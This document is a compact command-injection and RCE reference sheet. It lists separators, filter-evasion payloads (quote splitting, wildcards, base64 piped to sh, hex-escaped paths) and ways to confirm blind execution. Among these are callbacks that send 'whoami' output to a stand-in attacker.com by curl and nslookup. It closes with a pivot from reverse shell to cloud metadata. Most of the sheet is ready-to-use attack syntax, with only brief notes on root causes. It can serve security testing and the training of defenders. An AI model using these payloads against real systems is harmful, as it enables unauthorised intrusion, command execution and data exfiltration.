# Remote Code Execution (RCE) / Command Injection Reference

## Attack Surface Signals
- Features interacting with system tools: Ping/traceroute utilities, PDF generators, image converters (ImageMagick), backup/archive utilities, video transcoders (FFmpeg), git integrations.
- Parameters: `ip`, `host`, `domain`, `file`, `path`, `cmd`, `exec`, `url`, `template`.

## Injection Separators & Bypass Patterns
1. **Command Chaining Separators**:
   - `;`, `&`, `&&`, `|`, `||`, `
` (`%0a`), `
` (`%0d%0a`), `` `cmd` ``, `$(cmd)`.
2. **Whitespace Bypasses**:
   - `$IFS`, `${IFS}`, `$IFS$9`, `{cat,/etc/passwd}`, `<input.txt`, `%09` (Tab).
3. **Character & Blacklist Filter Evasion**:
   - String concatenation: `c'a't /e't'c/pas's'wd`, `c"a"t /e"t"c/pas"s"wd`.
   - Wildcards: `/bin/c?t /et?/pass*`, `/usr/bin/p*ng`.
   - Base64 decoding: `echo d2hvYW1p | base64 -d | sh`.
   - Environment variable slicing: `${PATH:0:1}` -> `/`.
   - Hex / Octal escaping: `$'\x2f\x62\x69\x6e\x2f\x73\x68'`.
4. **Blind RCE Confirmation**:
   - Time delay: `; sleep 5;`, `| ping -c 5 127.0.0.1`.
   - Out-of-band callback: `; curl http://attacker.com/$(whoami)`, `; nslookup $(whoami).attacker.com`.

## Common Root Causes
- Direct concatenation of user input into `system()`, `exec()`, `passthru()`, `shell_exec()`, `popen()`, `child_process.exec()`, `Runtime.getRuntime().exec()`.
- Argument injection: Flags like `--output`, `-o`, `--config` passed to CLI binaries enabling arbitrary file write or script loading.

## Exploit Chains
- **Command Injection → Reverse Shell / Cloud Metadata Pivot**: Spawning interactive shell to assume host IAM role or access internal container network.
